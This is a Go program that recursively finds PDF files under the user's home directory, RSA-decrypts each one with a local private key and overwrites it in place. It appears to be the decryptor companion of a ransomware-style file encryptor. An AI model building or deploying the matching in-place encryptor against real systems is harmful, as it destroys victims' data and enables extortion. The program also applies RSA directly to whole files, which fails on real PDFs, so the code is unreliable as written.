package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/pem"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"runtime"
	"time"
)

func mapFleExts(rt string, exts []string) ([]string, error) {
	var fleExts []string
	extMap := make(map[string]struct{})
	for _, ext := range exts {
		extMap[ext] = struct{}{}
	}
	er := filepath.Walk(rt, func(pth string, inf os.FileInfo, er error) error {
		if er != nil {
			return er
		}
		if !inf.IsDir() {
			ext := filepath.Ext(inf.Name())
			if _, ok := extMap[ext]; ok {
				absPth, er := filepath.Abs(pth)
				if er != nil {
					return er
				}
				fleExts = append(fleExts, absPth)
			}
		}
		return nil
	})
	return fleExts, er
}

func Decrypt(prKPth, b64Ct string) (string, error) {
	prKFle, er := os.Open(prKPth)
	if er != nil {
		return "", fmt.Errorf("ERR: opening PRKFLE: %v", er)
	}
	defer prKFle.Close()
	prKByts, er := io.ReadAll(prKFle)
	if er != nil {
		return "", fmt.Errorf("ERR: reading PRK: %v", er)
	}
	blk, _ := pem.Decode(prKByts)
	if blk == nil || blk.Type != "RSA PRIVATE KEY" {
		return "", fmt.Errorf("ERR: invalid PRK format")
	}
	prK, er := x509.ParsePKCS1PrivateKey(blk.Bytes)
	if er != nil {
		return "", fmt.Errorf("ERR: parsing PRK: %v", er)
	}
	ct, er := base64.StdEncoding.DecodeString(b64Ct)
	if er != nil {
		return "", fmt.Errorf("ERR: decoding CT: %v", er)
	}
	dt, er := rsa.DecryptOAEP(sha256.New(), rand.Reader, prK, ct, nil)
	if er != nil {
		return "", fmt.Errorf("ERR: decrypting DT: %v", er)
	}
	return string(dt), nil
}

func main() {
	prKPth := "./prK.pem"
	exts := []string{".pdf"}
	rtDir := ""
	switch runtime.GOOS {
	case "windows":
		rtDir = os.Getenv("USERPROFILE")
	default:
		rtDir = os.Getenv("HOME")
	}
	if rtDir == "" {
		rtDir = "D:\\"
		//rtDir = "C:\\"
	}
	flePths, er := mapFleExts(rtDir, exts)
	if er != nil {
		panic("ERR: mapping files")
	}
	for _, flePth := range flePths {
		b64Ct, er := os.ReadFile(flePth)
		if er != nil {
			panic("ERR: reading file data")
		}
		fmt.Printf("\nDecrypting %v...\n", flePth)
		fleDat, er := Decrypt(prKPth, string(b64Ct))
		if er != nil {
			panic("ERR: decrypting files")
		}
		time.Sleep(200 * time.Millisecond)
		os.WriteFile(flePth, []byte(fleDat), 0644)
	}
	fmt.Println("Finalizing...")
	time.Sleep(1 * time.Second)
	fmt.Println("All Done.")
}
